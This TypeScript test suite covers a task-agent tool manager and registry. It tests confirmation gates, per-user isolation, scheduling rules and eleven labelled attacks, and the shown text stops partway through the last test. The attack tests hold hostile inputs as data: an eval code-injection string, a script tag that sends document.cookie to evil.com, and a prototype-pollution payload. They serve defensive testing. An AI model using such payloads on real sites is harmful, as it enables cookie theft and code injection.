/**
 * Sentinel Nova — Day 5C Step 1
 * ToolManager & ToolRegistry Comprehensive Test Suite
 *
 * Verifies:
 * SECTION 1: ToolRegistry Lifecycle & Architecture
 *   1. Register valid tool
 *   2. Duplicate tool registration rejected (DuplicateToolRegistrationError)
 *   3. Unregister existing and nonexistent tools
 *   4. Unknown tool lookup handling
 *   5. Capability discovery (findByCapability)
 *   6. Immutability of registry metadata
 *
 * SECTION 2: Safe Task Tools (Complete & Reopen)
 *   7. Valid tool.task.complete execution
 *   8. Idempotent completion of already-completed task
 *   9. tool.task.complete parameter validation (missing, empty, non-string, code injection)
 *   10. Valid tool.task.reopen execution
 *   11. Idempotent reopening of already-open task
 *   12. tool.task.reopen parameter validation
 *
 * SECTION 3: Confirmation Gate & Authorization Boundaries
 *   13. Unconfirmed tool execution strictly rejected (CONFIRMATION_REQUIRED)
 *   14. Confirmed execution succeeds
 *   15. User isolation: cannot complete or reopen another user's task
 *   16. Action-to-Tool compatibility mapping enforcement (ACTION_NOT_ALLOWED on mismatch)
 *   17. Unknown action rejection
 *
 * SECTION 4: Attacks & Security Hardening (ATTACKS 1 - 11)
 *   18. ATTACK 1: Client spoofed userId in parameters is ignored/rejected
 *   19. ATTACK 2: Cross-tenant task mutation blocked
 *   20. ATTACK 3: Arbitrary code execution payload (eval, script, process.exit) rejected
 *   21. ATTACK 4: Unconfirmed execution bypass blocked
 *   22. ATTACK 5: Unknown tool invocation blocked (TOOL_NOT_FOUND)
 *   23. ATTACK 6: Action/tool mismatch blocked (ACTION_NOT_ALLOWED)
 *   24. ATTACK 7: Agent direct invocation bypass (Agents lack tool execution capabilities)
 *   25. ATTACK 8: Prototype pollution (__proto__, constructor) rejected
 *   26. ATTACK 9: Parameter payload overflow (>64KB) rejected
 *   27. ATTACK 10: Secret leakage prevention in traces & error sanitization
 *   28. ATTACK 11: Concurrent execution isolation across different users
 *
 * SECTION 5: Legacy Action Execution & Scheduling Invariants (1-12)
 *   29. Valid confirmed SCHEDULE_TASK succeeds
 *   30. Unconfirmed SCHEDULE_TASK rejected
 *   31. Foreign task schedule rejected
 *   32. Missing task schedule rejected
 *   33. Unknown action rejected
 *   34. Invalid timestamps rejected (INVALID_TIMESTAMPS)
 *   35. Start >= end rejected (INVALID_TIME_RANGE)
 *   36. Unavailable window rejected (WINDOW_UNAVAILABLE)
 *   37. Existing task fields preserved
 *   38. Exact duplicate schedule is idempotent
 *   39. Google Calendar read-only guarantee
 *   40. Failed validation causes zero mutation
 */

import { toolManager, ToolManager } from '../tools/ToolManager';
import { ToolRegistry } from '../tools/ToolRegistry';
import { BaseTool, ValidationResult } from '../tools/baseTool';
import { ToolMetadata, ToolContext } from '../tools/types';
import {
  DuplicateToolRegistrationError,
  ToolNotFoundError,
} from '../tools/errors';
import { AgentAction, BaseAgent } from '../index';
import { createTask, getTaskById, updateTask } from '../../taskStore';
import { savePlanningProfile } from '../../profileStore';
import { getCachedEvents, getUserCalendarStatus } from '../../calendarStore';
import { UserPlanningProfile } from '../../../src/types';

async function runToolManagerTests() {
  console.log('================================================================');
  console.log('--- SENTINEL NOVA TOOL MANAGER & REGISTRY TESTS (DAY 5C.1) ---');
  console.log('================================================================');

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, testName: string) {
    if (condition) {
      console.log(`[PASS] ${testName}`);
      passed++;
    } else {
      console.error(`[FAIL] ${testName}`);
      failed++;
    }
  }

  const runId = Date.now();
  const userA = `test-tm-user-alpha-${runId}`;
  const userB = `test-tm-user-bravo-${runId}`;

  // Base profile for User A (Standard work: 09:00 - 17:00, Sleep: 23:00 - 07:00)
  const profileA: UserPlanningProfile = {
    userId: userA,
    workingHours: {
      start: '09:00',
      end: '17:00',
      daysOfWeek: [1, 2, 3, 4, 5],
    },
    preferredWorkingHours: {
      startTime: '09:30',
      endTime: '12:30',
      days: ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'],
    },
    focusDurationMinutes: 60,
    bufferMinutes: 15,
    sleepSchedule: {
      bedtime: '23:00',
      wakeTime: '07:00',
    },
    recurringBlocks: [],
    timezone: 'UTC',
    onboardingCompleted: true,
    onboardingSkipped: false,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await savePlanningProfile(userA, profileA);

  // Seed tasks
  const taskA = await createTask(userA, {
    title: 'Deploy Sentinel Nova Tool Boundary',
    description: 'Enforce strict runtime authorization on all actions',
    priority: 'high',
    estimatedMinutes: 60,
    status: 'todo',
    tags: ['security', 'runtime'],
    subtasks: [
      { id: 'st1', title: 'Write safe execution contract', completed: true, createdAt: new Date().toISOString() },
    ],
    projectId: 'proj_security',
    goalId: 'goal_robustness',
    dependencyIds: ['dep_foundation'],
  });

  const taskB = await createTask(userB, {
    title: 'User B Private Financial Ledger',
    description: 'Strictly isolated User B task',
    priority: 'urgent',
    estimatedMinutes: 45,
    status: 'todo',
  });

  // =========================================================================
  // SECTION 1: ToolRegistry Lifecycle & Architecture
  // =========================================================================
  console.log('\n--- SECTION 1: ToolRegistry Lifecycle & Architecture ---');

  const customRegistry = new ToolRegistry();

  class MockTool extends BaseTool<{ value: string }, { result: string }> {
    public readonly metadata: ToolMetadata = {
      id: 'tool.mock.test',
      name: 'Mock Test Tool',
      description: 'Used for registry lifecycle tests',
      version: '1.0.0',
      category: 'system',
      riskLevel: 'low',
      requiresConfirmation: false,
      capabilities: ['mock_testing', 'verification'],
    };
    public validate(input: unknown): ValidationResult<{ value: string }> {
      if (!input || typeof (input as any).value !== 'string') {
        return { valid: false, error: 'value must be string' };
      }
      return { valid: true, validatedInput: { value: (input as any).value } };
    }
    public async execute(_context: ToolContext, input: { value: string }) {
      return { result: `Echo: ${input.value}` };
    }
  }

  const mockTool = new MockTool();

  // 1. Register valid tool
  customRegistry.register(mockTool);
  assert(customRegistry.has('tool.mock.test'), '1. Register valid tool');
  assert(customRegistry.size() === 1, '1b. Registry size is 1');

  // 2. Duplicate tool registration rejected
  let duplicateCaught = false;
  try {
    customRegistry.register(mockTool);
  } catch (err) {
    if (err instanceof DuplicateToolRegistrationError) {
      duplicateCaught = true;
    }
  }
  assert(duplicateCaught, '2. Duplicate tool registration throws DuplicateToolRegistrationError');

  // 3. Unregister existing and nonexistent tools
  const unregSuccess = customRegistry.unregister('tool.mock.test');
  assert(unregSuccess === true, '3. Unregister existing tool returns true');
  assert(customRegistry.has('tool.mock.test') === false, '3b. Tool is no longer in registry');
  const unregFail = customRegistry.unregister('tool.mock.nonexistent');
  assert(unregFail === false, '3c. Unregister nonexistent tool returns false');

  // Re-register for subsequent tests
  customRegistry.register(mockTool);

  // 4. Unknown tool lookup handling
  assert(customRegistry.get('tool.unknown') === undefined, '4. Unknown tool get returns undefined');
  let notFoundCaught = false;
  try {
    customRegistry.getOrThrow('tool.unknown');
  } catch (err) {
    if (err instanceof ToolNotFoundError) {
      notFoundCaught = true;
    }
  }
  assert(notFoundCaught, '4b. getOrThrow throws ToolNotFoundError for missing tool');

  // 5. Capability discovery (findByCapability)
  const foundByCap = customRegistry.findByCapability('mock_testing');
  assert(foundByCap.length === 1, '5. findByCapability discovers tool with matching capability');
  assert(foundByCap[0].id === 'tool.mock.test', '5b. Discovered tool ID matches');
  const missingCap = customRegistry.findByCapability('nonexistent_capability');
  assert(missingCap.length === 0, '5c. findByCapability returns empty array for unmatched capability');

  // 6. Immutability of registry metadata
  const listed = customRegistry.list();
  assert(listed.length === 1, '6. list returns registered tools');
  assert(Object.isFrozen(listed), '6b. list result is frozen');
  assert(Object.isFrozen(listed[0]), '6c. metadata object is frozen');

  // =========================================================================
  // SECTION 2: Safe Task Tools (Complete & Reopen)
  // =========================================================================
  console.log('\n--- SECTION 2: Safe Task Tools (Complete & Reopen) ---');

  // 7. Valid tool.task.complete execution
  const completeTaskA = await createTask(userA, {
    title: 'Task to Complete via Tool',
    status: 'todo',
    estimatedMinutes: 30,
  });

  const resComplete = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: completeTaskA.id, note: 'Finished ahead of schedule' },
    confirmed: true,
  });

  assert(resComplete.success === true, '7. Valid tool.task.complete execution succeeds');
  assert((resComplete.output as any)?.status === 'completed', '7b. Output indicates status completed');
  const taskACompletedInDb = await getTaskById(userA, completeTaskA.id);
  assert(taskACompletedInDb?.status === 'completed', '7c. Task status updated to completed in database');
  assert(taskACompletedInDb?.completedAt !== null, '7d. Task completedAt timestamp set');

  // 8. Idempotent completion of already-completed task
  const resCompleteIdempotent = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: completeTaskA.id },
    confirmed: true,
  });
  assert(resCompleteIdempotent.success === true, '8. Repeated complete on completed task succeeds');
  assert((resCompleteIdempotent.output as any)?.alreadyCompleted === true, '8b. Output indicates alreadyCompleted (idempotent)');

  // 9. tool.task.complete parameter validation
  const resMissingTaskId = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: {},
    confirmed: true,
  });
  assert(resMissingTaskId.success === false, '9. tool.task.complete rejects missing taskId');
  assert(resMissingTaskId.errorCode === 'INVALID_PARAMETERS', '9b. ErrorCode is INVALID_PARAMETERS');

  const resEmptyTaskId = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: '   ' },
    confirmed: true,
  });
  assert(resEmptyTaskId.success === false, '9c. tool.task.complete rejects empty string taskId');

  const resOversizedTaskId = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: 'x'.repeat(150) },
    confirmed: true,
  });
  assert(resOversizedTaskId.success === false, '9d. tool.task.complete rejects oversized taskId');

  // 10. Valid tool.task.reopen execution
  const resReopen = await toolManager.execute({
    toolId: 'tool.task.reopen',
    userId: userA,
    parameters: { taskId: completeTaskA.id },
    confirmed: true,
  });
  assert(resReopen.success === true, '10. Valid tool.task.reopen execution succeeds');
  assert((resReopen.output as any)?.status === 'todo', '10b. Output status is todo');
  const taskAReopenedInDb = await getTaskById(userA, completeTaskA.id);
  assert(taskAReopenedInDb?.status === 'todo', '10c. Task status in db restored to todo');

  // 11. Idempotent reopening of already-open task
  const resReopenIdempotent = await toolManager.execute({
    toolId: 'tool.task.reopen',
    userId: userA,
    parameters: { taskId: completeTaskA.id },
    confirmed: true,
  });
  assert(resReopenIdempotent.success === true, '11. Repeated reopen on open task succeeds');
  assert((resReopenIdempotent.output as any)?.alreadyOpen === true, '11b. Output indicates alreadyOpen (idempotent)');

  // 12. tool.task.reopen parameter validation
  const resReopenMissingId = await toolManager.execute({
    toolId: 'tool.task.reopen',
    userId: userA,
    parameters: {},
    confirmed: true,
  });
  assert(resReopenMissingId.success === false, '12. tool.task.reopen rejects missing taskId');

  // =========================================================================
  // SECTION 3: Confirmation Gate & Authorization Boundaries
  // =========================================================================
  console.log('\n--- SECTION 3: Confirmation Gate & Authorization Boundaries ---');

  const taskForConfirmation = await createTask(userA, {
    title: 'Task for Confirmation Gate Test',
    status: 'todo',
  });

  // 13. Unconfirmed tool execution strictly rejected
  const resUnconfirmed = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: taskForConfirmation.id },
    confirmed: false, // NOT confirmed!
  });
  assert(resUnconfirmed.success === false, '13. Unconfirmed tool execution rejected');
  assert(resUnconfirmed.errorCode === 'CONFIRMATION_REQUIRED', '13b. Error code is CONFIRMATION_REQUIRED');
  const taskStillTodo = await getTaskById(userA, taskForConfirmation.id);
  assert(taskStillTodo?.status === 'todo', '13c. Unconfirmed call caused zero mutation');

  // 14. Confirmed execution succeeds
  const resConfirmed = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: taskForConfirmation.id },
    confirmed: true,
  });
  assert(resConfirmed.success === true, '14. Confirmed execution succeeds');

  // 15. User isolation: cannot complete or reopen another user's task
  const resCrossUserComplete = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA, // User A attempting to complete User B's task
    parameters: { taskId: taskB.id },
    confirmed: true,
  });
  assert(resCrossUserComplete.success === false, '15. Cannot complete another user\'s task');
  assert(
    resCrossUserComplete.errorCode === 'RESOURCE_NOT_FOUND' || resCrossUserComplete.errorCode === 'UNAUTHORIZED',
    '15b. Cross-user complete yields RESOURCE_NOT_FOUND or UNAUTHORIZED'
  );
  const taskBCheck1 = await getTaskById(userB, taskB.id);
  assert(taskBCheck1?.status === 'todo', '15c. User B task remains untouched in storage');

  const resCrossUserReopen = await toolManager.execute({
    toolId: 'tool.task.reopen',
    userId: userA, // User A attempting to reopen User B's task
    parameters: { taskId: taskB.id },
    confirmed: true,
  });
  assert(resCrossUserReopen.success === false, '15d. Cannot reopen another user\'s task');

  // 16. Action-to-Tool compatibility mapping enforcement
  const resActionMismatch = await toolManager.execute({
    toolId: 'tool.task.reopen', // Mismatched! COMPLETE_TASK maps to tool.task.complete
    actionType: 'COMPLETE_TASK',
    userId: userA,
    parameters: { taskId: taskForConfirmation.id },
    confirmed: true,
  });
  assert(resActionMismatch.success === false, '16. Action/tool mismatch rejected');
  assert(resActionMismatch.errorCode === 'ACTION_NOT_ALLOWED', '16b. Error code is ACTION_NOT_ALLOWED');

  // 17. Unknown action rejection
  const resUnknownAction = await toolManager.execute({
    toolId: 'tool.task.complete',
    actionType: 'DELETE_DATABASE' as any,
    userId: userA,
    parameters: { taskId: taskForConfirmation.id },
    confirmed: true,
  });
  assert(resUnknownAction.success === false, '17. Unknown action rejected');
  assert(resUnknownAction.errorCode === 'ACTION_NOT_ALLOWED', '17b. Error code is ACTION_NOT_ALLOWED');

  // =========================================================================
  // SECTION 4: Attacks & Security Hardening (ATTACKS 1 - 11)
  // =========================================================================
  console.log('\n--- SECTION 4: Attacks & Security Hardening (ATTACKS 1 - 11) ---');

  // ATTACK 1: Client spoofed userId in parameters
  console.log('\n[ATTACK 1] Parameter userId spoofing');
  const resAttack1 = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: {
      taskId: taskB.id,
      userId: userB, // Attacker injects userB into parameters
    },
    confirmed: true,
  });
  assert(resAttack1.success === false, 'ATTACK 1: Spoofed parameter userId does not bypass context.userId');
  const taskBCheckAfterAttack1 = await getTaskById(userB, taskB.id);
  assert(taskBCheckAfterAttack1?.status === 'todo', 'ATTACK 1: Target task was not mutated');

  // ATTACK 2: Cross-tenant task mutation
  console.log('\n[ATTACK 2] Cross-tenant task mutation');
  const resAttack2 = await toolManager.execute({
    toolId: 'tool.task.schedule',
    userId: userA,
    parameters: {
      taskId: taskB.id,
      scheduledStart: '2026-09-15T10:00:00.000Z',
      scheduledEnd: '2026-09-15T11:00:00.000Z',
    },
    confirmed: true,
  });
  assert(resAttack2.success === false, 'ATTACK 2: Cross-tenant task scheduling rejected');

  // ATTACK 3: Arbitrary code execution payload
  console.log('\n[ATTACK 3] Code execution injection in parameters');
  const resAttack3a = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: {
      taskId: `task_id; eval("process.exit(1)");`,
    },
    confirmed: true,
  });
  assert(resAttack3a.success === false, 'ATTACK 3a: Code injection eval() in taskId rejected');

  const resAttack3b = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: {
      taskId: taskA.id,
      note: `<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>`,
    },
    confirmed: true,
  });
  assert(resAttack3b.success === false, 'ATTACK 3b: Script tag in parameters rejected');

  // ATTACK 4: Unconfirmed execution bypass
  console.log('\n[ATTACK 4] Unconfirmed execution bypass');
  const resAttack4 = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: taskA.id },
    confirmed: false,
  });
  assert(resAttack4.success === false && resAttack4.errorCode === 'CONFIRMATION_REQUIRED', 'ATTACK 4: Unconfirmed call rejected');

  // ATTACK 5: Unknown tool invocation
  console.log('\n[ATTACK 5] Unknown tool invocation');
  const resAttack5 = await toolManager.execute({
    toolId: 'tool.arbitrary.shell_exec',
    userId: userA,
    parameters: { cmd: 'ls -la' },
    confirmed: true,
  });
  assert(resAttack5.success === false && resAttack5.errorCode === 'TOOL_NOT_FOUND', 'ATTACK 5: Unknown tool rejected with TOOL_NOT_FOUND');

  // ATTACK 6: Action/tool mismatch
  console.log('\n[ATTACK 6] Action/tool mismatch');
  const resAttack6 = await toolManager.execute({
    toolId: 'tool.task.complete',
    actionType: 'SCHEDULE_TASK', // Mismatch!
    userId: userA,
    parameters: { taskId: taskA.id },
    confirmed: true,
  });
  assert(resAttack6.success === false && resAttack6.errorCode === 'ACTION_NOT_ALLOWED', 'ATTACK 6: Action/tool mismatch rejected');

  // ATTACK 7: Agent direct invocation bypass
  console.log('\n[ATTACK 7] Agent direct invocation bypass check');
  // Verify BaseAgent does NOT have any executeTool / toolManager references
  const baseAgentInstance = new (class TestAgent extends BaseAgent {
    public readonly id = 'agent.test_safety';
    public readonly name = 'Test Safety Agent';
    public readonly description = 'Checks agent boundaries';
    public readonly version = '1.0.0';
    public readonly capabilities = ['analysis' as const];
    public async run() {
      return { success: true, agentId: this.id, data: {}, timestamp: new Date().toISOString() };
    }
  })();
  assert(!('toolManager' in baseAgentInstance), 'ATTACK 7: BaseAgent has zero toolManager reference');
  assert(!('executeTool' in baseAgentInstance), 'ATTACK 7b: BaseAgent has zero executeTool method');

  // ATTACK 8: Prototype pollution in parameters
  console.log('\n[ATTACK 8] Prototype pollution attempt');
  const maliciousProtoPayload = JSON.parse('{"__proto__": {"polluted": true}, "taskId": "test"}');
  const resAttack8 = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: maliciousProtoPayload,
    confirmed: true,
  });
  assert(resAttack8.success === false, 'ATTACK 8: Prototype pollution payload rejected');
  assert((Object.prototype as any).polluted === undefined, 'ATTACK 8b: Object prototype remains unpolluted');

  // ATTACK 9: Parameter payload overflow (>64KB)
  console.log('\n[ATTACK 9] Oversized parameter payload (>64KB)');
  const giantString = 'A'.repeat(70000);
  const resAttack9 = await toolManager.execute({
    toolId: 'tool.task.complete',
    userId: userA,
    parameters: { taskId: 't1', big: giantString },
    confirmed: true,
  });
  assert(resAttack9.success === false && resAttack9.errorCode === 'INVALID_PARAMETERS', 'ATTACK 9: >64KB payload rejected');

  // ATTACK 10: Secret leakage prevention in traces & error sanitization
  console.log('\n[ATTACK 10] Trace credential audit');
  const traces = toolManager.getRecentTraces();
  assert(traces.length > 0, 'ATTACK 10: Traces are recorded');
  const traceString = JSON.stringify(traces);
  assert(!traceString.includes('Bearer '), 'ATTACK 10b: Traces contain no Bearer tokens');
  assert(!traceString.includes('secret_oauth'), 'ATTACK 10c: Traces contain no secrets');
  assert(!traceString.includes('/Users/'), 'ATTACK 10d: Traces contain no local developer paths');

  // ATTACK 11: Concurrent execution isolation across different users
  console.log('\n[ATTACK 11] Concurrent execution isolation');
  const taskC1 = await createTask(userA, { title: 'Concurrent A1', status: 'todo' });
  const taskC2 = await createTask(userB, { title: 'Concurrent B1', status: 'todo' });

  const [resC1, resC2] = await Promise.all([
    toolManager.execute({
      toolId: 'tool.task.complete',
      userId: userA,
      parameters: { taskId: taskC1.id },
      confirmed: true,
    }),
    toolManager.execute({
      toolId: 'tool.task.complete',
      userId: userB,
      parameters: { taskId: taskC2.id },
      confirmed: true,
    }),
  ]);

  assert(resC1.success === true, 'ATTACK 11: User A concurrent execution succeeded');
  assert(resC2.success === true, 'ATTACK 11b: User B concurrent execution succeeded');
  const taskC1Check = await getTaskById(userA, taskC1.id);
  const taskC2Check = await getTaskById(userB, taskC2.id);
  assert(taskC1Check?.status === 'completed', 'ATTACK 11c: Task C1 completed');
  assert(taskC2Check?.status === 'completed', 'ATTACK 11d: Task C2 completed');

  // =========================================================================
  // SECTION 5: Legacy Action Execution & Scheduling Invariants (1-12)
  // =========================================================================
  console.log('\n--- SECTION 5: Legacy Action Execution & Scheduling Invariants ---');

  const tomorrow = new Date();
  tomorrow.setDate(tomorrow.getDate() + 1);
  const dateStr = tomorrow.toISOString().split('T')[0];

  const validStart = `${dateStr}T10:00:00.000Z`;
  const validEnd = `${dateStr}T11:00:00.000Z`;

  const baseScheduleAction: AgentAction = {
    actionId: 'act_sched_001',
    type: 'SCHEDULE_TASK',
    description: 'Schedule task during prime focus window',
    target: taskA.id,
    parameters: {
      taskId: taskA.id,
      scheduledStart: validStart,
      scheduledEnd: validEnd,
      durationMinutes: 60,
    },
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.scheduler',
  };

  // TEST 29: Valid confirmed SCHEDULE_TASK succeeds
  const res29 = await toolManager.executeAction(baseScheduleAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res29.success === true, '29. Valid confirmed SCHEDULE_TASK succeeds');
  assert(res29.toolName === 'SCHEDULE_TASK', '29b. Tool execution records toolName as SCHEDULE_TASK');
  assert(res29.data?.taskId === taskA.id, '29c. Tool execution returns target task ID');
  assert(res29.rollbackAvailable === true, '29d. Rollback availability is recorded');

  // Verify task was actually mutated in taskStore
  const mutatedTaskA = await getTaskById(userA, taskA.id);
  assert(mutatedTaskA?.scheduledStart === validStart, '29e. Task scheduledStart updated in database');
  assert(mutatedTaskA?.scheduledEnd === validEnd, '29f. Task scheduledEnd updated in database');

  // TEST 30: Unconfirmed action rejected
  const unconfirmedAction: AgentAction = {
    ...baseScheduleAction,
    actionId: 'act_unconfirmed_002',
    parameters: {
      ...baseScheduleAction.parameters,
      scheduledStart: `${dateStr}T14:00:00.000Z`,
      scheduledEnd: `${dateStr}T15:00:00.000Z`,
    },
  };

  const res30 = await toolManager.executeAction(unconfirmedAction, {
    userId: userA,
    userConfirmed: false,
  });
  assert(res30.success === false, '30. Unconfirmed action rejected');
  assert(res30.error === 'CONFIRMATION_REQUIRED', '30b. Error code is CONFIRMATION_REQUIRED');
  const afterUnconfirmedTask = await getTaskById(userA, taskA.id);
  assert(afterUnconfirmedTask?.scheduledStart === validStart, '30c. Unconfirmed action caused zero mutation');

  // TEST 31: Foreign task rejected
  const foreignTaskAction: AgentAction = {
    actionId: 'act_foreign_003',
    type: 'SCHEDULE_TASK',
    description: 'Attempt to schedule User B task as User A',
    target: taskB.id,
    parameters: {
      taskId: taskB.id,
      userId: userB,
      scheduledStart: validStart,
      scheduledEnd: validEnd,
    },
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.scheduler',
  };

  const res31 = await toolManager.executeAction(foreignTaskAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res31.success === false, '31. Foreign task rejected');
  assert(res31.error === 'TASK_NOT_FOUND' || res31.error === 'FORBIDDEN', '31b. Error code prevents foreign task mutation');
  const taskBCheck = await getTaskById(userB, taskB.id);
  assert(taskBCheck?.scheduledStart === null || taskBCheck?.scheduledStart === undefined, '31c. User B task untouched');

  // TEST 32: Missing task rejected
  const missingTaskAction: AgentAction = {
    actionId: 'act_missing_004',
    type: 'SCHEDULE_TASK',
    description: 'Schedule a nonexistent task',
    target: 'task_phantom_99999',
    parameters: {
      taskId: 'task_phantom_99999',
      scheduledStart: validStart,
      scheduledEnd: validEnd,
    },
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.scheduler',
  };
  const res32 = await toolManager.executeAction(missingTaskAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res32.success === false, '32. Missing task rejected');
  assert(res32.error === 'TASK_NOT_FOUND', '32b. Error code is TASK_NOT_FOUND');

  // TEST 33: Unknown action rejected
  const unknownAction: AgentAction = {
    actionId: 'act_unknown_005',
    type: 'INSPECT_CONTEXT' as any,
    description: 'Unsupported tool execution attempt',
    target: 'all',
    parameters: {},
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.inspector',
  };
  const res33 = await toolManager.executeAction(unknownAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res33.success === false, '33. Unknown action rejected');
  assert(res33.error === 'UNSUPPORTED_ACTION_TYPE', '33b. Error code is UNSUPPORTED_ACTION_TYPE');

  // TEST 34: Invalid timestamps rejected
  const invalidTimeAction: AgentAction = {
    ...baseScheduleAction,
    actionId: 'act_invalid_time_006',
    parameters: {
      taskId: taskA.id,
      scheduledStart: 'not-a-valid-date',
      scheduledEnd: validEnd,
    },
  };
  const res34 = await toolManager.executeAction(invalidTimeAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res34.success === false, '34. Invalid timestamps rejected');
  assert(res34.error === 'INVALID_TIMESTAMPS', '34b. Error code is INVALID_TIMESTAMPS');

  // TEST 35: Start >= end rejected
  const invertedTimeAction: AgentAction = {
    ...baseScheduleAction,
    actionId: 'act_inverted_007',
    parameters: {
      taskId: taskA.id,
      scheduledStart: `${dateStr}T12:00:00.000Z`,
      scheduledEnd: `${dateStr}T10:00:00.000Z`,
    },
  };
  const res35 = await toolManager.executeAction(invertedTimeAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res35.success === false, '35. Start >= end rejected');
  assert(res35.error === 'INVALID_TIME_RANGE', '35b. Error code is INVALID_TIME_RANGE');

  // Equal start and end
  const equalTimeAction: AgentAction = {
    ...baseScheduleAction,
    actionId: 'act_equal_007b',
    parameters: {
      taskId: taskA.id,
      scheduledStart: `${dateStr}T10:00:00.000Z`,
      scheduledEnd: `${dateStr}T10:00:00.000Z`,
    },
  };
  const res35b = await toolManager.executeAction(equalTimeAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res35b.success === false, '35c. Equal start and end rejected');

  // TEST 36: Unavailable window rejected (Sleep Rhythm)
  const sleepConflictAction: AgentAction = {
    ...baseScheduleAction,
    actionId: 'act_sleep_conflict_008',
    parameters: {
      taskId: taskA.id,
      scheduledStart: `${dateStr}T03:00:00.000Z`,
      scheduledEnd: `${dateStr}T04:00:00.000Z`,
    },
  };
  const res36 = await toolManager.executeAction(sleepConflictAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res36.success === false, '36. Unavailable window rejected (sleep rhythm violation)');
  assert(res36.error === 'WINDOW_UNAVAILABLE', '36b. Error code is WINDOW_UNAVAILABLE');

  // TEST 37: Existing task fields preserved
  const richTask = await createTask(userA, {
    title: 'Rich Metadata Task',
    description: 'Must remain 100% intact after scheduling',
    priority: 'urgent',
    status: 'in_progress',
    estimatedMinutes: 60,
    tags: ['core', 'critical', 'architecture'],
    subtasks: [
      { id: 'st_r1', title: 'Subtask 1', completed: true, createdAt: new Date().toISOString() },
      { id: 'st_r2', title: 'Subtask 2', completed: false, createdAt: new Date().toISOString() },
    ],
    projectId: 'proj_enterprise',
    goalId: 'goal_quarterly',
    dependencyIds: ['dep_task_101'],
  });

  const richAction: AgentAction = {
    actionId: 'act_rich_009',
    type: 'SCHEDULE_TASK',
    description: 'Schedule rich task in afternoon slot',
    target: richTask.id,
    parameters: {
      taskId: richTask.id,
      scheduledStart: `${dateStr}T15:00:00.000Z`,
      scheduledEnd: `${dateStr}T16:00:00.000Z`,
    },
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.scheduler',
  };

  const res37 = await toolManager.executeAction(richAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res37.success === true, '37. Rich task scheduled successfully');
  const afterRichTask = await getTaskById(userA, richTask.id);
  assert(afterRichTask?.title === 'Rich Metadata Task', '37b. Title preserved');
  assert(afterRichTask?.description === 'Must remain 100% intact after scheduling', '37c. Description preserved');
  assert(afterRichTask?.priority === 'urgent', '37d. Priority preserved');
  assert(afterRichTask?.status === 'in_progress', '37e. Status preserved');
  assert(afterRichTask?.projectId === 'proj_enterprise', '37f. ProjectId preserved');
  assert(afterRichTask?.goalId === 'goal_quarterly', '37g. GoalId preserved');
  assert(Array.isArray(afterRichTask?.tags) && afterRichTask.tags.length === 3, '37h. Tags preserved');
  assert(Array.isArray(afterRichTask?.subtasks) && afterRichTask.subtasks.length === 2, '37i. Subtasks preserved');
  assert(Array.isArray(afterRichTask?.dependencyIds) && afterRichTask.dependencyIds[0] === 'dep_task_101', '37j. Dependency IDs preserved');
  assert(afterRichTask?.scheduledStart === `${dateStr}T15:00:00.000Z`, '37k. scheduledStart updated');
  assert(afterRichTask?.scheduledEnd === `${dateStr}T16:00:00.000Z`, '37l. scheduledEnd updated');

  // TEST 38: Exact duplicate schedule is idempotent
  const res38 = await toolManager.executeAction(richAction, {
    userId: userA,
    userConfirmed: true,
  });
  assert(res38.success === true, '38. Exact duplicate schedule is idempotent');
  assert(res38.message.includes('idempotent'), '38b. Response message identifies idempotent execution');

  // TEST 39: Google Calendar is not modified
  const initialCalendarEvents = getCachedEvents(userA);
  const initialCalendarStatus = getUserCalendarStatus(userA);

  await toolManager.executeAction(richAction, {
    userId: userA,
    userConfirmed: true,
  });

  const postCalendarEvents = getCachedEvents(userA);
  const postCalendarStatus = getUserCalendarStatus(userA);

  assert(initialCalendarEvents.length === postCalendarEvents.length, '39. Google Calendar cached events count unchanged');
  assert(initialCalendarStatus.status === postCalendarStatus.status, '39b. Google Calendar connection status untouched');
  assert(!('writeCalendarEvent' in toolManager), '39c. ToolManager contains zero calendar write methods');

  // TEST 40: Failed validation causes zero mutation
  const unassignedTask = await createTask(userA, {
    title: 'Unscheduled Task Under Validation',
    estimatedMinutes: 90,
    status: 'todo',
  });

  const durationMismatchAction: AgentAction = {
    actionId: 'act_mismatch_012',
    type: 'SCHEDULE_TASK',
    description: 'Attempt to schedule with insufficient window duration',
    target: unassignedTask.id,
    parameters: {
      taskId: unassignedTask.id,
      scheduledStart: `${dateStr}T11:00:00.000Z`,
      scheduledEnd: `${dateStr}T11:30:00.000Z`, // 30 mins < 90 mins required
    },
    riskLevel: 'low',
    requiresConfirmation: true,
    sourceAgentId: 'agent.scheduler',
  };

